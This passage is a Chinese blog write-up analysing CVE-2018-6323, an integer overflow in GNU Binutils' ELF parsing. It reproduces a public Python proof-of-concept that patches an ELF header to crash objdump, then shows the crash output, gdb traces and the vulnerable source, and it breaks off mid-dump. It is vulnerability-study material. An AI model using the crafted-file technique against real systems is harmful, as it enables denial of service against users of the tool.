<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>CVE-2018-6323分析 | </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="CVE-2018-6323参考 https:&#x2F;&#x2F;www.cvedetails.com&#x2F;cve&#x2F;CVE-2018-6323&#x2F; https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;44035 https:&#x2F;&#x2F;firmianay.github.io&#x2F;2018&#x2F;03&#x2F;01&#x2F;binutils_2018-6323.html https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;4973">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2018-6323分析">
<meta property="og:url" content="http://yoursite.com/2020/02/16/CVE-2018-6323%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="">
<meta property="og:description" content="CVE-2018-6323参考 https:&#x2F;&#x2F;www.cvedetails.com&#x2F;cve&#x2F;CVE-2018-6323&#x2F; https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;44035 https:&#x2F;&#x2F;firmianay.github.io&#x2F;2018&#x2F;03&#x2F;01&#x2F;binutils_2018-6323.html https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;4973">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-02-16T15:09:12.000Z">
<meta property="article:modified_time" content="2020-02-16T15:11:36.310Z">
<meta property="article:author" content="ConzeHsu">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo"></a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-CVE-2018-6323分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/16/CVE-2018-6323%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2020-02-16T15:09:12.000Z" itemprop="datePublished">2020-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2018-6323分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2018-6323"><a href="#CVE-2018-6323" class="headerlink" title="CVE-2018-6323"></a>CVE-2018-6323</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.cvedetails.com/cve/CVE-2018-6323/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2018-6323/</a></li>
<li><a href="https://www.exploit-db.com/exploits/44035" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44035</a></li>
<li><a href="https://firmianay.github.io/2018/03/01/binutils_2018-6323.html" target="_blank" rel="noopener">https://firmianay.github.io/2018/03/01/binutils_2018-6323.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/49735267" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/49735267</a></li>
</ol>
<h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>发行版GNU Binutils 2.29.1中，二进制文件描述符库（BFD，Binary File Descriptor）elfcode.h中的elf_object_p函数存在无符号整数溢出漏洞，原因是没有使用bfd_size_type乘法，使用特定的ELF文件可以允许远程攻击者程序拒绝服务。</p>
<p>触发整体思路：objdump在解析二进制文件头的时候会计算program header所占的大小，我们把他要解析的progran header count构造为一个大数，随后在后面计算时由于没有使用bfd_size_type乘法，导致截断溢出。使得后续函数把其作为参数使用时，找不到指针，抛出异常。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-环境要求"><a href="#1-环境要求" class="headerlink" title="1. 环境要求"></a>1. 环境要求</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 4.15.0-76-generic (buildd@lcy01-amd64-011) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12))</span><br></pre></td></tr></table></figure>

<h3 id="2-检查当前的bintuils版本并安装我们所需要的版本"><a href="#2-检查当前的bintuils版本并安装我们所需要的版本" class="headerlink" title="2. 检查当前的bintuils版本并安装我们所需要的版本"></a>2. 检查当前的bintuils版本并安装我们所需要的版本</h3><p><code>ld</code>程序是GNU Binutils项目中的一个程序，通过此可以看出当前机器所自带的是Binutils 2.26.1版本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┳━hsu@ubuntu ~   21:34:04</span><br><span class="line">┻━━$ ld -v</span><br><span class="line">GNU ld (GNU Binutils) 2.26.1</span><br></pre></td></tr></table></figure>

<p>安装Binutils 2.29.1 版本,<code>--enable-64-bit-bdf</code>使得Binutils支持64位</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:35:21</span><br><span class="line">┻━━$ ./configure --enable-64-bit-bfd</span><br><span class="line">┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:35:49 1 ↵</span><br><span class="line">┻━━$ make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>

<p>安装后的Binutils 2.29.1版本程序放在了<code>/usr/local/bin</code>下，随后查看一下默认的binutils各个程序的版本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:38:08</span><br><span class="line">┻━━$ ld -v</span><br><span class="line">GNU ld (GNU Binutils) 2.29.1</span><br></pre></td></tr></table></figure>

<h3 id="3-触发脚本"><a href="#3-触发脚本" class="headerlink" title="3. 触发脚本"></a>3. 触发脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Objdump - Integer Overflow Crash POC</span></span><br><span class="line"><span class="comment"># Date: 12.02.2018</span></span><br><span class="line"><span class="comment"># Exploit Author: r4xis</span></span><br><span class="line"><span class="comment"># Tested Version: 2.26.1</span></span><br><span class="line"><span class="comment"># Vuln Version: &lt;2.29.1</span></span><br><span class="line"><span class="comment"># CVE: cve-2018-6323</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 16.04 32-bit </span></span><br><span class="line"><span class="comment"># Vulnerability Details: </span></span><br><span class="line"><span class="comment"># https://www.cvedetails.com/cve/CVE-2018-6323/</span></span><br><span class="line"><span class="comment"># https://sourceware.org/bugzilla/show_bug.cgi?id=22746</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">hello = <span class="string">"#include&lt;stdio.h&gt;\nint main()&#123;printf(\"HelloWorld!\\n\"); return 0;&#125;"</span></span><br><span class="line">f = open(<span class="string">"helloWorld.c"</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(hello)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"gcc -c helloWorld.c -o test"</span>)</span><br><span class="line"><span class="comment"># file test</span></span><br><span class="line"><span class="comment"># test: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"test"</span>, <span class="string">'rb+'</span>)</span><br><span class="line">f.read(<span class="number">0x2c</span>)</span><br><span class="line">f.write(<span class="string">"\xff\xff"</span>) <span class="comment"># 65535</span></span><br><span class="line">f.read(<span class="number">0x244</span><span class="number">-0x2c</span><span class="number">-2</span>)</span><br><span class="line">f.write(<span class="string">"\x00\x00\x00\x20"</span>) <span class="comment"># 536870912</span></span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># readelf -h test</span></span><br><span class="line"><span class="comment"># Number of program headers:         65535 (536870912)</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"objdump -x test; rm -r helloWorld.c test"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┳━hsu@ubuntu ~/Desktop   21:40:19</span><br><span class="line">┻━━$ python exp.py</span><br><span class="line">objdump: test: File truncated</span><br><span class="line">*** Error in `objdump': free(): invalid pointer: 0x0852faa8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb7db0377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb7db62f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6dc31)[0xb7db6c31]</span><br><span class="line">objdump[0x814feab]</span><br><span class="line">objdump[0x8096c10]</span><br><span class="line">objdump[0x80985fc]</span><br><span class="line">objdump[0x8099257]</span><br><span class="line">objdump[0x8052791]</span><br><span class="line">objdump[0x804c1af]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7d61637]</span><br><span class="line">objdump[0x804c3ca]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">08048000-08245000 r-xp 00000000 08:01 131682     /usr/local/bin/objdump</span><br><span class="line">08245000-08246000 r--p 001fc000 08:01 131682     /usr/local/bin/objdump</span><br><span class="line">08246000-0824b000 rw-p 001fd000 08:01 131682     /usr/local/bin/objdump</span><br><span class="line">0824b000-08250000 rw-p 00000000 00:00 0</span><br><span class="line">0852e000-0854f000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7a00000-b7a21000 rw-p 00000000 00:00 0</span><br><span class="line">b7a21000-b7b00000 ---p 00000000 00:00 0</span><br><span class="line">b7b15000-b7b31000 r-xp 00000000 08:01 654746     /lib/i386-linux-gnu/libgcc_s.so.1</span><br><span class="line">b7b31000-b7b32000 rw-p 0001b000 08:01 654746     /lib/i386-linux-gnu/libgcc_s.so.1</span><br><span class="line">b7b48000-b7d48000 r--p 00000000 08:01 1055141    /usr/lib/locale/locale-archive</span><br><span class="line">b7d48000-b7d49000 rw-p 00000000 00:00 0</span><br><span class="line">b7d49000-b7ef9000 r-xp 00000000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b7ef9000-b7efb000 r--p 001af000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b7efb000-b7efc000 rw-p 001b1000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">b7efc000-b7eff000 rw-p 00000000 00:00 0</span><br><span class="line">b7eff000-b7f02000 r-xp 00000000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so</span><br><span class="line">b7f02000-b7f03000 r--p 00002000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so</span><br><span class="line">b7f03000-b7f04000 rw-p 00003000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so</span><br><span class="line">b7f11000-b7f12000 rw-p 00000000 00:00 0</span><br><span class="line">b7f12000-b7f19000 r--s 00000000 08:01 1052776    /usr/lib/i386-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">b7f19000-b7f1a000 r--p 00741000 08:01 1055141    /usr/lib/locale/locale-archive</span><br><span class="line">b7f1a000-b7f1b000 rw-p 00000000 00:00 0</span><br><span class="line">b7f1b000-b7f1e000 r--p 00000000 00:00 0          [vvar]</span><br><span class="line">b7f1e000-b7f20000 r-xp 00000000 00:00 0          [vdso]</span><br><span class="line">b7f20000-b7f43000 r-xp 00000000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">b7f43000-b7f44000 r--p 00022000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">b7f44000-b7f45000 rw-p 00023000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">bfab2000-bfad3000 rw-p 00000000 00:00 0          [stack]</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<h3 id="4-分析"><a href="#4-分析" class="headerlink" title="4. 分析"></a>4. 分析</h3><p>我们看一下发生core dumped的test文件，test作为<code>relocatable</code>文件，重定位的文件的<code>Number of program headers</code>字段，保存的是<code>segment</code>信息，而<code>segment</code>是为了给加载器提供可执行程序在加载时所需的信息的，而可重定位文件本身并不能直接执行，因此relocatable的文件中的<code>program header table</code>应为0，而从以下结果来看此值被赋予了一个较大的值<code>65535</code>，已经超出了程序在内存中的范围</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┳━hsu@ubuntu ~/Desktop   21:42:35</span><br><span class="line">┻━━$ file test</span><br><span class="line">test: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped</span><br><span class="line">┳━hsu@ubuntu ~/Desktop   21:43:14</span><br><span class="line">┻━━$ readelf -h test</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2's complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          552 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         65535 (536870912)</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 12</span><br><span class="line">readelf: Error: Out of memory reading 536870912 program headers</span><br></pre></td></tr></table></figure>

<p>该程序是执行<code>objdump -x test</code>是崩溃掉的，而objdump是一个命令行程序，它可以用作反汇编程序，以汇编形式查看可执行文件的各种信息。并且objdump使用BFD库读取目标文件的内容。随后我们对<code>objdump</code>程序进行调试（先确定是不是2.29.1版本）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r -x <span class="built_in">test</span></span></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> bt</span></span><br><span class="line"><span class="meta">#</span><span class="bash">0  0xb7fd9cf5 <span class="keyword">in</span> __kernel_vsyscall ()</span></span><br><span class="line"><span class="meta">#</span><span class="bash">1  0xb7e2fea9 <span class="keyword">in</span> __GI_raise (sig=0x6) at ../sysdeps/unix/sysv/linux/raise.c:54</span></span><br><span class="line"><span class="meta">#</span><span class="bash">2  0xb7e31407 <span class="keyword">in</span> __GI_abort () at abort.c:89</span></span><br><span class="line"><span class="meta">#</span><span class="bash">3  0xb7e6b37c <span class="keyword">in</span> __libc_message (do_abort=0x2, fmt=0xb7f63e54 <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>) at ../sysdeps/posix/libc_fatal.c:175</span></span><br><span class="line"><span class="meta">#</span><span class="bash">4  0xb7e712f7 <span class="keyword">in</span> malloc_printerr (action=&lt;optimized out&gt;, str=0xb7f60943 <span class="string">"free(): invalid pointer"</span>, ptr=&lt;optimized out&gt;, ar_ptr=0xb7fb6780 &lt;main_arena&gt;) at malloc.c:5006</span></span><br><span class="line"><span class="meta">#</span><span class="bash">5  0xb7e71c31 <span class="keyword">in</span> _int_free (av=0xb7fb6780 &lt;main_arena&gt;, p=&lt;optimized out&gt;, have_lock=0x0) at malloc.c:3867</span></span><br><span class="line"><span class="meta">#</span><span class="bash">6  0x0814feab <span class="keyword">in</span> objalloc_free (o=0x8250800) at ./objalloc.c:187</span></span><br><span class="line"><span class="meta">#</span><span class="bash">7  0x08096c10 <span class="keyword">in</span> bfd_hash_table_free (table=0x8250a4c) at hash.c:426</span></span><br><span class="line"><span class="meta">#</span><span class="bash">8  0x080985fc <span class="keyword">in</span> _bfd_delete_bfd (abfd=abfd@entry=0x8250a08) at opncls.c:125</span></span><br><span class="line"><span class="meta">#</span><span class="bash">9  0x08099257 <span class="keyword">in</span> bfd_close_all_done (abfd=0x8250a08) at opncls.c:773</span></span><br><span class="line"><span class="meta">#</span><span class="bash">10 0x08052791 <span class="keyword">in</span> display_file (filename=0xbffff7bd <span class="string">"test"</span>, target=&lt;optimized out&gt;, last_file=0x1) at ./objdump.c:3726</span></span><br><span class="line"><span class="meta">#</span><span class="bash">11 0x0804c1af <span class="keyword">in</span> main (argc=0x3, argv=0xbffff654) at ./objdump.c:4015</span></span><br><span class="line"><span class="meta">#</span><span class="bash">12 0xb7e1c637 <span class="keyword">in</span> __libc_start_main (main=0x804ba50 &lt;main&gt;, argc=0x3, argv=0xbffff654, init=0x8150fd0 &lt;__libc_csu_init&gt;, fini=0x8151030 &lt;__libc_csu_fini&gt;,</span></span><br><span class="line">    rtld_fini=0xb7fea880 &lt;_dl_fini&gt;, stack_end=0xbffff64c) at ../csu/libc-start.c:291</span><br><span class="line"><span class="meta">#</span><span class="bash">13 0x0804c3ca <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<p>通过回溯栈调用，我们查看一下<code>binutils-2.29.1/bfd/elfcode.h</code>中的<code>elf_object_p</code>函数中读取program headers的代码逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Read in the program headers.  */</span></span><br><span class="line">  <span class="keyword">if</span> (i_ehdrp-&gt;e_phnum == <span class="number">0</span>)<span class="comment">//e_phnum为Program header table entry count</span></span><br><span class="line">    elf_tdata (abfd)-&gt;phdr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf_Internal_Phdr *i_phdr;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BFD64</span></span><br><span class="line">      <span class="keyword">if</span> (i_ehdrp-&gt;e_phnum &gt; ((bfd_size_type) <span class="number">-1</span>) / <span class="keyword">sizeof</span> (*i_phdr))</span><br><span class="line">	<span class="keyword">goto</span> got_wrong_format_error;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      amt = i_ehdrp-&gt;e_phnum * <span class="keyword">sizeof</span> (*i_phdr);<span class="comment">//Vulnerable，i_phdr是Elf32_Phdr的结构体，此乘法即存储program header所需要的总大小</span></span><br><span class="line">      elf_tdata (abfd)-&gt;phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);</span><br><span class="line">      <span class="keyword">if</span> (elf_tdata (abfd)-&gt;phdr == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">goto</span> got_no_match;</span><br><span class="line">      <span class="keyword">if</span> (bfd_seek (abfd, (file_ptr) i_ehdrp-&gt;e_phoff, SEEK_SET) != <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> got_no_match;</span><br><span class="line">      i_phdr = elf_tdata (abfd)-&gt;phdr;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; i_ehdrp-&gt;e_phnum; i++, i_phdr++)</span><br><span class="line">	&#123;</span><br><span class="line">	  Elf_External_Phdr x_phdr;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (bfd_bread (&amp;x_phdr, <span class="keyword">sizeof</span> x_phdr, abfd) != <span class="keyword">sizeof</span> x_phdr)</span><br><span class="line">	    <span class="keyword">goto</span> got_no_match;</span><br><span class="line">	  elf_swap_phdr_in (abfd, &amp;x_phdr, i_phdr);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由下图可以看出，当前指令<code>imul eax,eax,0x38</code>,伪造的数值<code>0xffff</code> 大于 0，然后在溢出点乘法运算前，eax 为伪造的数值<code>0x20000000</code>：做乘法运算结果eax为0x700000000，产生溢出，高位被截断丢弃</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x20000000 ('')</span><br><span class="line">EBX: <span class="number">0x8250a08</span> --&gt; <span class="number">0x8250810</span> (<span class="string">"test"</span>)</span><br><span class="line">ECX: <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line">EDX: <span class="number">0x5f</span> (<span class="string">'_'</span>)</span><br><span class="line">ESI: <span class="number">0x8250ac8</span> --&gt; <span class="number">0x464c457f</span></span><br><span class="line">EDI: <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line">EBP: <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line">ESP: <span class="number">0xbffff370</span> --&gt; <span class="number">0xb7fe97eb</span> (&lt;_dl_fixup+<span class="number">11</span>&gt;:	add    esi,<span class="number">0x15815</span>)</span><br><span class="line">EIP: <span class="number">0x80aeba0</span> (&lt;bfd_elf32_object_p+<span class="number">1856</span>&gt;:	imul   eax,eax,<span class="number">0x38</span>)</span><br><span class="line">EFLAGS: <span class="number">0x206</span> (carry PARITY adjust zero sign trap INTERRUPT direction <span class="built_in">overflow</span>)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x80aeb90</span> &lt;bfd_elf32_object_p+<span class="number">1840</span>&gt;:	<span class="keyword">or</span>     DWORD PTR [ebx+<span class="number">0x28</span>],<span class="number">0x800</span></span><br><span class="line">   <span class="number">0x80aeb97</span> &lt;bfd_elf32_object_p+<span class="number">1847</span>&gt;:	jmp    <span class="number">0x80ae613</span> &lt;bfd_elf32_object_p+<span class="number">435</span>&gt;</span><br><span class="line">   <span class="number">0x80aeb9c</span> &lt;bfd_elf32_object_p+<span class="number">1852</span>&gt;:	lea    esi,[esi+eiz*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">=&gt; <span class="number">0x80aeba0</span> &lt;bfd_elf32_object_p+<span class="number">1856</span>&gt;:	imul   eax,eax,<span class="number">0x38</span></span><br><span class="line">   <span class="number">0x80aeba3</span> &lt;bfd_elf32_object_p+<span class="number">1859</span>&gt;:	sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x80aeba6</span> &lt;bfd_elf32_object_p+<span class="number">1862</span>&gt;:	<span class="keyword">xor</span>    edx,edx</span><br><span class="line">   <span class="number">0x80aeba8</span> &lt;bfd_elf32_object_p+<span class="number">1864</span>&gt;:	push   edx</span><br><span class="line">   <span class="number">0x80aeba9</span> &lt;bfd_elf32_object_p+<span class="number">1865</span>&gt;:	push   eax</span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xbffff370</span> --&gt; <span class="number">0xb7fe97eb</span> (&lt;_dl_fixup+<span class="number">11</span>&gt;:	add    esi,<span class="number">0x15815</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xbffff374</span> --&gt; <span class="number">0x8250ac8</span> --&gt; <span class="number">0x464c457f</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xbffff378</span> --&gt; <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line"><span class="number">0012</span>| <span class="number">0xbffff37c</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0016</span>| <span class="number">0xbffff380</span> --&gt; <span class="number">0x8250a0c</span> --&gt; <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line"><span class="number">0020</span>| <span class="number">0xbffff384</span> --&gt; <span class="number">0x82482a0</span> --&gt; <span class="number">0x9</span> (<span class="string">'\t'</span>)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0xbffff388</span> --&gt; <span class="number">0x8250a08</span> --&gt; <span class="number">0x8250810</span> (<span class="string">"test"</span>)</span><br><span class="line"><span class="number">0028</span>| <span class="number">0xbffff38c</span> --&gt; <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, 